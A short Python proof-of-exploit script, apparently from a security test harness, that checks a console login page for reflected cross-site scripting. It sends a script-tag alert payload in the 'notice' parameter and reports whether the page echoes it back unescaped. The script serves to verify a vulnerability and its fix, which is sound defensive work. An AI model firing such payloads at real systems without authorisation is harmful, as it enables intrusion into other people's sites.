"""LG-XSS-001 proof-of-exploit: reflected XSS in the console sign-on notice.

Requests the public login page with a <script> payload in ?notice=. With rich_notices=on the notice
is reflected into the HTML unescaped, so the raw <script> tag comes back. Fires when the reply
contains the marker script verbatim. With the fix the payload is HtmlEscape'd (&lt;script&gt;) and
stays inert. Hits the console directly. Env: PASCAL_URL.
"""

import os
import re

from harness import env, http


def fire():
    mark = f"LGXSS{os.getpid()}"
    payload = f"<script>alert('{mark}')</script>"
    reply = http.get(f"{env.url('PASCAL_URL')}/login", params={"notice": payload})
    if payload in reply.text:
        return True, f"notice reflected unescaped (raw <script> in reply, marker {mark})"
    echoed = re.search(rf"[^<]*{mark}[^>]*", reply.text)
    return False, f"escaped or absent: {echoed.group(0) if echoed else ''}"
